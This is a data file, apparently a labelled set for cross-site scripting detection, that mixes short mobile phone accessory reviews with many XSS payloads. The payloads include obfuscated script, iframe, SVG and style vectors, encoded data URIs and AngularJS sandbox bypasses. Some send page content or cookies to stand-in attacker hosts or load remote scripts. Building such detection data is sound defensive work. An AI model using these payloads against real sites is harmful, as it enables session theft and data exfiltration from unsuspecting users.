418;<Scr<SCRIpt>IpT>ALERt(docUMeNt.CookIe)</Scr</SCriPT>IPt>;;;;;;;;;;;;;;;;;;;;;;;;
419;Cheap but hey it works.. Was pleasantly suprised given the low cost of this item.;;;;;;;;;;;;;;;;;;;;;;;;
420;foo<script>alert(document.cookie)</script>;;;;;;;;;;;;;;;;;;;;;;;;
421;Not worth it.;;;;;;;;;;;;;;;;;;;;;;;;
422;"<tablE><td BacKgROunD=""jAVASCRIPT:ALERt('XSs')"">";;;;;;;;;;;;;;;;;;;;;;;;
423;<iFRAme/Src=jaVAscRIpT:ALErt(1)>;;;;;;;;;;;;;;;;;;;;;;;;
424;Nice Sound.;;;;;;;;;;;;;;;;;;;;;;;;
425;<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;;&#97lert(1)>ClickMe;;;;;;;;;;;;;;;;;;;;;;
426;The sound quality is excellent as well.;;;;;;;;;;;;;;;;;;;;;;;;
427;<IMG SRC=javascript:alert(String.fromCharCode(88;83;83))>;;;;;;;;;;;;;;;;;;;;;;
428;"&LT;DIV STYLE=\""WIDTH&#58; EXPRESSION(ALERT('XSS'));\""&GT;";;;;;;;;;;;;;;;;;;;;;;;;
429;�;; ALERT(DOCUMENT.COOKIE); VAR FOO=�;;;;;;;;;;;;;;;;;;;;;
430;&LT;;STYLE&GT;@IMPORT'HTTP&#58;//HA&#46;CKERS&#46;ORG/XSS&#46;CSS';&LT;/STYLE&GT;;;;;;;;;;;;;;;
431;"&lt;img lowsrc=\""javascript&#058;alert('xss')\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
432;"<div style=""background-image: url(javascript:alert('xss'))"">";;;;;;;;;;;;;;;;;;;;;;;;
433;DO NOT BUY DO NOT BUYIT SUCKS;;;;;;;;;;;;;;;;;;;;;;;;
434;if you simply want a small flip phone -- look elsewhere as the extra bells & whistles are mediocre.;;;;;;;;;;;;;;;;;;;;;;;;
435;Worked very well paired with a Treo 7w and as a Skype headset on my PC (using a USB Bluetooth transceiver).;;;;;;;;;;;;;;;;;;;;;;;;
436;It doesn't make you look cool.;;;;;;;;;;;;;;;;;;;;;;;;
437;the worst phone from samsung...crap..... this crappy Samsung E75.. is the worst i have ever seeen.;;;;;;;;;;;;;;;;;;;;;;;;
438;"<svg/onload=""(new Image()).src='//attacker.com/'%2Bdocument.documentElement.innerHTML"">";;;;;;;;;;;;;;;;;;;;;;;;
439;"<iMg """"""><ScRIpT>alERT(""XSs"")</ScRIPt>""\>";;;;;;;;;;;;;;;;;;;;;;;;
440;"&LT;STYLE&GT;@IM\PORT'\JA\VASC\RIPT&#58;ALERT(\""XSS\"")';&LT;/STYLE&GT;";;;;;;;;;;;;;;;;;;;;;;;;
441;<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>;;;;;;;;;;;;;;;;;;;;;;;;
442;<script/&Tab;; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>;;;;;;;;;;;;;;;;;;;;;
443;"<input/onmouseover=""javaSCRIPT&colon;confirm&lpar;1&rpar;""";;;;;;;;;;;;;;;;;;;;;;;;
444;The reception has been generally good.;;;;;;;;;;;;;;;;;;;;;;;;
445;Perfect for the PS3.;;;;;;;;;;;;;;;;;;;;;;;;
446;<IMG SRC=&#106;;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
447;<img/&#09;;&#10;&#11; src=`~` onerror=prompt(1)>;;;;;;;;;;;;;;;;;;;;
448;This is simply the BEST bluetooth headset for sound quality!;;;;;;;;;;;;;;;;;;;;;;;;
449;"<forM><iSINDex FORMAcTiOn=""JAVAscRipT&cOLOn;CoNfiRm(1)""";;;;;;;;;;;;;;;;;;;;;;;;
450;%2BADw-ScripT+aD4-ALeRT(DOcument.loCATiOn)%2bADW-/sCript%2baD4-;;;;;;;;;;;;;;;;;;;;;;;;
451;Everything about this product is wrong.First;;;;;;;;;;;;;;;;;;;;;;;;
452;"<DIV STYLE=""FONT-FAMILY:'FOO&#10;;COLOR:RED;';"">LOL";;;;;;;;;;;;;;;;;;;;;;;;
453;<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3a;;&#97lert(1)>clickme;;;;;;;;;;;;;;;;;;;;;;
454;So anyone near you will hear part of your conversation.;;;;;;;;;;;;;;;;;;;;;;;;
455;"&LT;DIV STYLE=\""BACKGROUND-IMAGE&#58;\0075\0072\006C\0028'\006A\0061\0076\0061\0073\0063\0072\0069\0070\0074\003A\0061\006C\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\""&GT;";;;;;;;;;;;;;;;;;;;;;;;;
456;Comfortable fit - you need your headset to be comfortable for at least an hour at a time; if not for an entire day.;;;;;;;;;;;;;;;;;;;;;;;
457;This case has passed the one year mark and while it shows signs of wear; it is % functional.;;;;;;;;;;;;;;;;;;;;;;;
458;<img src=`%00`&NewLine;; onerror=alert(1)&NewLine;;;;;;;;;;;;;;;;;;;;;;
459;So just beware.;;;;;;;;;;;;;;;;;;;;;;;;
460;"&LT;IMG SRC=\""JAV&#X0A;ASCRIPT&#058;ALERT('XSS');\""&GT;";;;;;;;;;;;;;;;;;;;;;;;;
461;%2BACIAPGA8-SCRIPT%2BAD4-ALERT%28DOCUMENT.LOCATION%29%2BADW-%2FSCRIPT%2BAD4APAAI-;;;;;;;;;;;;;;;;;;;;;;;;
462;"&lt;DIV STYLE=\""width&#58; expression(alert('XSS'));\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
463;"&lt;IMg lowsrC=\""jAVaSCriPt&#058;aLErT('xss')\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
464;<script/src=https://www.google.com/complete/search?client=chrome&q=hello&callback=alert></script>;;;;;;;;;;;;;;;;;;;;;;;;
465;+ACIAPGA8-SCRIPT+AD4-ALERT(DOCUMENT.LOCATION)+ADW-/SCRIPT+AD4APAAI-;;;;;;;;;;;;;;;;;;;;;;;;
466;<SCRIPT>FETCH('HTTP://X-ORACLE-V0.NN9ED.KA0LABS.ORG/ADMIN/SEARCH/X%27%20UNION%20SELECT%20FLAG%20FROM%20CHALLENGE%23').THEN(_=>_.TEXT()).THEN(_=>NEW IMAGE().SRC='HTTP://PLAYER_SERVER/?'+_)</SCRIPT>;;;;;;;;;;;;;;;;;;;;;;;;
467;Its well-designed and very sharp -- the blue is a very nice color.;;;;;;;;;;;;;;;;;;;;;;;;
468;"<SVG ONLOAD=""JAVASCRIPT:ALERT(123)"" XMLNS=""#""></SVG>";;;;;;;;;;;;;;;;;;;;;;;;
469;"<svg onload=""javascript:alert(123)"" xmlns=""#""></svg>";;;;;;;;;;;;;;;;;;;;;;;;
470;dont buy it.;;;;;;;;;;;;;;;;;;;;;;;;
471;"<EmbED SrC=""hTTp://CORKami.gooGLEcodE.COm/SVn/!sVN/bc/480/tRUnK/mISC/pDf/HElloWorld_jS_x.PDF"">";;;;;;;;;;;;;;;;;;;;;;;;
472;The earpiece on this is too large or too heavy...it keeps falling out of my ear.;;;;;;;;;;;;;;;;;;;;;;;;
473;The cutouts and buttons are placed perfectly.;;;;;;;;;;;;;;;;;;;;;;;;
474;I would highly recommend this product.;;;;;;;;;;;;;;;;;;;;;;;;
475;Because both ears are occupied; background is not distracting at all.;;;;;;;;;;;;;;;;;;;;;;;
476;This is a great phone!.;;;;;;;;;;;;;;;;;;;;;;;;
477;It's a great tool for entertainment; communication; and data management.Oh; be sure to use ActiveSync 4.2 for optimal data synchronization results!;;;;;;;;;;;;;;;;;;;;;
478;"&lt;BR SIZE=\""&{alert('XSS')}\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
479;"</script><img/*%00/src=""worksinchrome&colon;prompt&#x28;1&#x29;""/%00*/onerror='eval(src)'>";;;;;;;;;;;;;;;;;;;;;;;;
480;The internet access was fine; it the rare instance that it worked.;;;;;;;;;;;;;;;;;;;;;;;
481;This is a great product..... sure beats using your fingers!.;;;;;;;;;;;;;;;;;;;;;;;;
482;Bought mainly for the charger; which broke soon after purchasing.;;;;;;;;;;;;;;;;;;;;;;;
483;It was horrible!.;;;;;;;;;;;;;;;;;;;;;;;;
484;"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>";;;;;;;;;;;;;;;;;;;;;;;;
485;Don't bother - go to the store.;;;;;;;;;;;;;;;;;;;;;;;;
486;<input onfocus=write(XSS) autofocus>;;;;;;;;;;;;;;;;;;;;;;;;
487;in addition it feels &amp;; looks as if the phone is all lightweight cheap plastic.;;;;;;;;;;;;;;;;;;;;;;
488;Just what I wanted.;;;;;;;;;;;;;;;;;;;;;;;;
489;foo<script>alert(document.cookie)</script>;;;;;;;;;;;;;;;;;;;;;;;;
490;%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-;;;;;;;;;;;;;;;;;;;;;;;;
491;"&LT;layER Src=\""hTtP&#58;//ha&#46;ckErs&#46;Org/SCRiptleT&#46;hTmL\""&GT;&lt;/lAYeR&GT;";;;;;;;;;;;;;;;;;;;;;;;;
492;The volume for the ringer is REAL good (you have choices how loud).;;;;;;;;;;;;;;;;;;;;;;;;
493;<InPUt oNblUr=WRitE(xss) AutoFOcus><INPUT aUtOfoCuS>;;;;;;;;;;;;;;;;;;;;;;;;
494;This allows the possibility of double booking for the same date and time after the first.;;;;;;;;;;;;;;;;;;;;;;;;
495;I posted more detailed comments under the grey or black phone; but i have the Fire Red and it's a great color!;;;;;;;;;;;;;;;;;;;;;;;
496;"<IMG """"""><SCRIPT>ALERT(""XSS"")</SCRIPT>""\>";;;;;;;;;;;;;;;;;;;;;;;;
497;So I had to take the battery out of the phone put it all back together and then restart it.;;;;;;;;;;;;;;;;;;;;;;;;
498;Performed awful -- muffled; tinny incoming sound and severe echo for those on the other end of the call.;;;;;;;;;;;;;;;;;;;;;;;
499;THey are so cool!;;;;;;;;;;;;;;;;;;;;;;;;
500;For the price this was a great deal.;;;;;;;;;;;;;;;;;;;;;;;;
501;"&Lt;DiV StyLE=\""backGround-ImAge&#58; url(JavaScRipT&#058;ALERt('XSS'))\""&gT;";;;;;;;;;;;;;;;;;;;;;;;;
502;<IMG SRC=&#106;;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
503;"&lt;LINK REL=\""stylesheet\"" HREF=\""javascript&#058;alert('XSS');\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
504;"<ifRaME sRC='dAtA:Text/HTmL,<sCrIpt DeFer=""trUe"" SRc=""dATa:TExT/JaVasCriPt,DOCumeNt.BOdY.iNnERtExt=/HellO/""></scriPT>'></IFRAme>";;;;;;;;;;;;;;;;;;;;;;;;
505;My phone sounded OK ( not great - OK); but my wife's phone was almost totally unintelligible; she couldn't understand a word being said on it.;;;;;;;;;;;;;;;;;;;;;;
506;"<IFRAME SRC=""JAVASCRIPT:ALERT('XSS');""></IFRAME>";;;;;;;;;;;;;;;;;;;;;;;;
507;"<iframe src=""javascript:alert('xss');""></iframe>";;;;;;;;;;;;;;;;;;;;;;;;
508;If you are looking for a good quality Motorola Headset keep looking; this isn't it.;;;;;;;;;;;;;;;;;;;;;;;
509;Disapointing Results.;;;;;;;;;;;;;;;;;;;;;;;;
510;It quit working after I'd used it for about 8 months; so I just purchased another one because this is the best headset I've ever owned.;;;;;;;;;;;;;;;;;;;;;;;
511;"<diV STYle=""bAcKgrOunD-iMAge:\0075\0072\006c\0028'\006A\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">";;;;;;;;;;;;;;;;;;;;;;;;
512;"""/>'><SCRIPT SRC=""/USER_UPLOAD/MYPIC.PNG.JS""></SCRIPT>";;;;;;;;;;;;;;;;;;;;;;;;
513;"""><sCRIPt src=dAta:tExT/JavAScrIpT;BaSe64,ZD1Kb2N1bWVUDdSgxya9IgQuY3jlyxRlrWxLbWVUdCgnC2nyAxb0jyK7XY5pzD0NMtkNo18ubm9uy2U9ZC5xDwvyEVNLBgvjDg9yKCDbbm9uY2VdJykUBM9UY2u7Xy5ZCMM9jY8VBG9JyWXOB3N0l20nO2Quym9kEs5hchblbmRDAGLSZchfKsa=></SCrIPT>";;;;;;;;;;;;;;;;;;;;;;;;
514;Couldn't figure it out;;;;;;;;;;;;;;;;;;;;;;;;
515;I like design and look of Jabra behing the ear headsets and 52 is pretty comfortible to wear 24 hours a day without pain in the ear.;;;;;;;;;;;;;;;;;;;;;;;;
516;"<Meta HTTp-EQuiv=""REFREsH"" cOnteNT=""0;url=JAvaScRIpT:ALert('xss');"">";;;;;;;;;;;;;;;;;;;;;;;;
517;All the other cases I've tried normally fall apart after a few months but this one seems to be in for the long haul.;;;;;;;;;;;;;;;;;;;;;;;;
518;%253cScRIpt%253EalERt(doCuMENt.CookIE)%253c/SCrIPt%253E�><<scRiPT>aLert(DOCumeNt.COOKIe);;//<</ScRIpt>;;;;;;;;;;;;;;;;;;;;;;
519;Obviously they have a terrible customer service; so you get what you pay for.;;;;;;;;;;;;;;;;;;;;;;;
520;I get absolutely horrible reception in my apartment; where with other phones I have not had this problem.;;;;;;;;;;;;;;;;;;;;;;;
521;<iframe/src=javascript:alert(1)>;;;;;;;;;;;;;;;;;;;;;;;;
522;"<form><iframe &#09;&#10;&#11; src=""javascript&#58;alert(1)""&#11;&#10;&#09;;>";;;;;;;;;;;;;;;;;;;;;;;;
523;<script 5-0*3+9/3=>prompt(1)</script giveanswerhere=?;;;;;;;;;;;;;;;;;;;;;;;;
524;"<script src=""https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js""></script><script src=""https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js"" /></script><div ng-app ng-csp>{{ x = $on.curry.call().eval(""fetch('http://localhost/index.php').then(d => {})"") }}</div>""><script src=""https://cdnjs.cloudflare.com/angular.min.js""></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>""><script src=""https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js""> </script><div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>";;;;;;;;;;;;;;;;;;;;;;;;
525;The first thing that happened was that the tracking was off.;;;;;;;;;;;;;;;;;;;;;;;;
526;Chinese Forgeries Abound!.;;;;;;;;;;;;;;;;;;;;;;;;
527;"&lt;link rel=\""stylesheet\"" href=\""javascript&#058;alert('xss');\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
528;fOo<scrIpT>AleRt(DocUmEnT.CoOkie)</ScRipT>;;;;;;;;;;;;;;;;;;;;;;;;
529;Can't store anything but phone numbers to SIM.;;;;;;;;;;;;;;;;;;;;;;;;
530;It works fine on my Motorola 325 cellphone; and a lot better than the worn-out battery did.;;;;;;;;;;;;;;;;;;;;;;;
531;%22/%3e%3cbody%20onload=�document.write(%22%3cs%22%2b%22cript%20src=http://my.box.com/xss.js%3e%3c/script%3e%22)�%3e;;;;;;;;;;;;;;;;;;;;;;;;
532;"<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">";;;;;;;;;;;;;;;;;;;;;;;;
533;"<div style=""font-family:'foo&#10;;color:red;';"">LOL";;;;;;;;;;;;;;;;;;;;;;;;
534;"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">";;;;;;;;;;;;;;;;;;;;;;;;
535;�;; alert(document.cookie); var foo=�;;;;;;;;;;;;;;;;;;;;;
536;"document.queryselector('div').innerhtml=""<iframe src='javascript:var s = document.createelement(\""script\"");s.src = \""https://pastebin.com/raw/dw5cwgk6\"";document.body.appendchild(s);'></iframe>"";";;;;;;;;;;;;;;;;;;;;;;;;
537;"<INPUT/ONMOUSEOVER=""JAVASCRIPT&COLON;CONFIRM&LPAR;1&RPAR;""";;;;;;;;;;;;;;;;;;;;;;;;
538;I love the look and feel of Samsung flipphones.;;;;;;;;;;;;;;;;;;;;;;;;
539;Much less than the jawbone I was going to replace it with.;;;;;;;;;;;;;;;;;;;;;;;;
540;Overall; I would recommend this phone over the new Walkman.;;;;;;;;;;;;;;;;;;;;;;;
541;The battery life is highly unacceptable.;;;;;;;;;;;;;;;;;;;;;;;;
542;"<EMBED SRC=""DATA:IMAGE/SVG+XML;BASE64,PHN2ZYB4BWXUCZPZDMC9IMH0DH A6LY93D3CUDZMUB3JNLZIWMDAVC3ZNIIB4BWXUCZ0IAHR0CDOVL3D3DY53MY5VCMCV MJAWMC9ZDMCIIHHTBG5ZONHSAW5RPSJODHRWOI8VD3D3LNCZLM9YZY8XOTK5L3HS AW5RIIB2ZXJZAW9UPSIXLJAIIHG9IJAIIHK9IJAIIHDPZHROPSIXOTQIIGHLAWDODD0IMJAW IIBPZD0IEHNZIJ48C2NYAXB0IHR5CGU9INRLEHQVZWNTYXNJCMLWDCI+YWXLCNQOILH TUYIPOZWVC2NYAXB0PJWVC3ZNPG=="" TYPE=""IMAGE/SVG+XML"" ALLOWSCRIPTACCESS=""ALWAYS""></EMBED>";;;;;;;;;;;;;;;;;;;;;;;;
543;"<audio controls autoplay onended=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>";;;;;;;;;;;;;;;;;;;;;;;;
544;<img/src=`%00` onerror=this.onerror=confirm(1);;;;;;;;;;;;;;;;;;;;;;;;
545;"""><script src=data:text/javascript;base64,ZD1kb2N1bWVudDsgXyA9IGQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7Xy5pZD0nMTknO18ubm9uY2U9ZC5xdWVyeVNlbGVjdG9yKCdbbm9uY2VdJykubm9uY2U7Xy5zcmM9Jy8vbG9jYWxob3N0L20nO2QuYm9keS5hcHBlbmRDaGlsZChfKSA=></script>";;;;;;;;;;;;;;;;;;;;;;;;
546;Great phone.;;;;;;;;;;;;;;;;;;;;;;;;
547;T-Mobile has the best customer service anywhere.;;;;;;;;;;;;;;;;;;;;;;;;
548;Sprint charges for this service.;;;;;;;;;;;;;;;;;;;;;;;;
549;"&lt;DIV STYLE=\""background-image&#58;\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
550;My father has the V265; and the battery is dying.;;;;;;;;;;;;;;;;;;;;;;;
551;The design might be ergonomic in theory but I could not stand having these in my ear.;;;;;;;;;;;;;;;;;;;;;;;;
552;<input onblur=write(xss) autofocus><input autofocus>;;;;;;;;;;;;;;;;;;;;;;;;
553;"<math><a xlink:href=""//jsfiddle.net/t846h/"">click";;;;;;;;;;;;;;;;;;;;;;;;
554;Yet Plantronincs continues to use the same flawed charger design.;;;;;;;;;;;;;;;;;;;;;;;;
555;"&lt;LAYER SRC=\""http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\""&gt;&lt;/LAYER&gt;";;;;;;;;;;;;;;;;;;;;;;;;
556;"<svg xmlns=""#""><script>alert(1)</script></svg>";;;;;;;;;;;;;;;;;;;;;;;;
557;"&lt;layer src=\""http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\""&gt;&lt;/layer&gt;";;;;;;;;;;;;;;;;;;;;;;;;
558;"&LT;LINK REL=\""STYLESHEET\"" HREF=\""JAVASCRIPT&#058;ALERT('XSS');\""&GT;";;;;;;;;;;;;;;;;;;;;;;;;
559;I did not have any problem with this item and would order it again if needed.;;;;;;;;;;;;;;;;;;;;;;;;
560;"<audio autoplay onloadedmetadata=alert(1)> <source src=""validaudio.wav"" type=""audio/wav""></audio>";;;;;;;;;;;;;;;;;;;;;;;;
561;I'm pleased.;;;;;;;;;;;;;;;;;;;;;;;;
562;+ADW-SCRIPT+AD4-ALERT(DOCUMENT.LOCATION)+ADW-/SCRIPT+AD4-;;;;;;;;;;;;;;;;;;;;;;;;
563;<img src=javascript:alert(string.fromcharcode(88;83;83))>;;;;;;;;;;;;;;;;;;;;;;
564;"""/>'><script src=https://attacker.com/evil.js></script>";;;;;;;;;;;;;;;;;;;;;;;;
565;<img/src=`%00` onerror=this.onerror=confirm(1);;;;;;;;;;;;;;;;;;;;;;;;
566;"<AUDIO CONTROLS AUTOPLAY ONENDED=ALERT(1)><SOURCE SRC=""VALIDAUDIO.WAV"" TYPE=""AUDIO/WAV""></AUDIO>";;;;;;;;;;;;;;;;;;;;;;;;
567;"&Lt;iMG SrC=\""jaV&#X0A;AsCRIPT&#058;AlERT('xss');\""&Gt;";;;;;;;;;;;;;;;;;;;;;;;;
568;"&LT;XSS STYLE=\""XSS&#58;EXPRESSION(ALERT('XSS'))\""&GT;";;;;;;;;;;;;;;;;;;;;;;;;
569;<script>confirm()</script>;;;;;;;;;;;;;;;;;;;;;;;;
570;I was amazed at the quick arrival of the two original lg cell phone batteries and and at a fraction of the price.;;;;;;;;;;;;;;;;;;;;;;;;
571;Plus; I seriously do not believe it is worth its steep price point.;;;;;;;;;;;;;;;;;;;;;;;
572;"<sVg oNLoAD=""JAvascript:ALeRt(123)"" xMlnS=""#""></SvG>";;;;;;;;;;;;;;;;;;;;;;;;
573;"&lt;bgsound src=\""javascript&#058;alert('xss');\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
574;I am more than happy with this product.;;;;;;;;;;;;;;;;;;;;;;;;
575;"<iFRaME/SRC=""DaTa:TeXT/hTml;&TAb;BAse64&tAb;,PGJvzhKGB25sb2FkPwFszxJ0KdeppG=="">";;;;;;;;;;;;;;;;;;;;;;;;
576;"<a href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">click me</a>";;;;;;;;;;;;;;;;;;;;;;;;
577;I bought this battery with a coupon from Amazon and I'm very happy with my purchase.;;;;;;;;;;;;;;;;;;;;;;;;
578;"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/""/+/onmouseover=1/+/[*/[]/+document.location=`//localhost/mH`//'>";;;;;;;;;;;;;;;;;;;;;;;;
579;The nano stated it.My son was dissapointed.;;;;;;;;;;;;;;;;;;;;;;;;
580;"EXp/*&lt;A STYLe='No\XsS&#58;nOXss(\""*//*\"");";;;;;;;;;;;;;;;;;;;;;;;;
581;"<iframe src='data:text/html,<script defer=""true"" src=""data:text/javascript,document.body.innertext=/hello/""></script>'></iframe>";;;;;;;;;;;;;;;;;;;;;;;;
582;<SCRIPT 5-0*3+9/3=>PROMPT(1)</SCRIPT GIVEANSWERHERE=?;;;;;;;;;;;;;;;;;;;;;;;;
583;The tracfonewebsite is user friendly and makes it easy toactivate; etc.;;;;;;;;;;;;;;;;;;;;;;;
584;<SCRIPT ^__^>ALERT(STRING.FROMCHARCODE(49))</SCRIPT ^__^;;;;;;;;;;;;;;;;;;;;;;;;
585;sentence;;;;;;;;;;;;;;;;;;;;;;;;
586;"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>";;;;;;;;;;;;;;;;;;;;;;;;
587;"<img """"""><script>alert(""xss"")</script>""\>";;;;;;;;;;;;;;;;;;;;;;;;
588;"<script src=""https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js""></script><script src=""https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js"" /></script><div ng-app ng-csp>{{ x = $on.curry.call().eval(""fetch('http://localhost/index.php').then(d => {})"") }}</div>""><script src=""https://cdnjs.cloudflare.com/angular.min.js""></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>""><script src=""https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js""> </script><div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>";;;;;;;;;;;;;;;;;;;;;;;;
589;The camera on the phone may be used as a dustpan when indoors... I'd rather be using a disposable then this.;;;;;;;;;;;;;;;;;;;;;;;;
590;"<IFrAME %00 srC=""&tab;jAVAScRiPt:pRoMpt(1)&TAb;""%00>";;;;;;;;;;;;;;;;;;;;;;;;
591;A good quality bargain.. I bought this after I bought a cheapy from Big Lots that sounded awful and people on the other end couldn't hear me.;;;;;;;;;;;;;;;;;;;;;;;;
592;+Adw-sCRiPT+ad4-aleRT(dOCUmeNT.loCaTion)+adW-/ScRiPT+ad4-;;;;;;;;;;;;;;;;;;;;;;;;
593;Linked to my phone without effort.;;;;;;;;;;;;;;;;;;;;;;;;
594;"<DIV STYLE=""BACKGROUND-IMAGE: URL(JAVASCRIPT:ALERT('XSS'))"">";;;;;;;;;;;;;;;;;;;;;;;;
595;I have a Verizon LG phone and they work well together; good reception and range that exceeds 2 feet line of sight.;;;;;;;;;;;;;;;;;;;;;;;
596;I could not recommend these more.;;;;;;;;;;;;;;;;;;;;;;;;
597;It lasts less than 3o minutes; if I actually try to use the phone.My wife has the same phone with the same problem.;;;;;;;;;;;;;;;;;;;;;;;
598;You can't beat the price on these.;;;;;;;;;;;;;;;;;;;;;;;;
599;<imG/&#09;;&#10;&#11; SRC=`~` ONErRor=PrOmpt(1)>;;;;;;;;;;;;;;;;;;;;
600;"&lt;xss style=\""xss&#58;expression(alert('xss'))\""&gt;";;;;;;;;;;;;;;;;;;;;;;;;
601;Product is exactly as described.;;;;;;;;;;;;;;;;;;;;;;;;
602;"<EMBED SRC=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="" type=""image/svg+xml"" AllowScriptAccess=""always""></EMBED>";;;;;;;;;;;;;;;;;;;;;;;;
603;"xsS&#58;ex&#X2F;*xss*//*/*/PrEssIon(alERT(\""XSS\""))'&gT;";;;;;;;;;;;;;;;;;;;;;;;;
604;<a id=x tabindex=1 onfocusin=alert(1)></a>;;;;;;;;;;;;;;;;;;;;;;;;
605;"<ifRamE nAme=""adMin"" srC=""HTTps://bYPASSES-eVeRYwHERE.ctF.inSeCURITY-InsA.Fr/ADMin""></IfRame>";;;;;;;;;;;;;;;;;;;;;;;;
606;"<TABLE BACKGROUND=""JAVASCRIPT:ALERT('XSS')"">";;;;;;;;;;;;;;;;;;;;;;;;
607;Gets a signal when other Verizon phones won't.;;;;;;;;;;;;;;;;;;;;;;;;
608;Great price; too!;;;;;;;;;;;;;;;;;;;;;;;
609;The design is very good.4.;;;;;;;;;;;;;;;;;;;;;;;;
610;And none of the tones is acceptable.;;;;;;;;;;;;;;;;;;;;;;;;
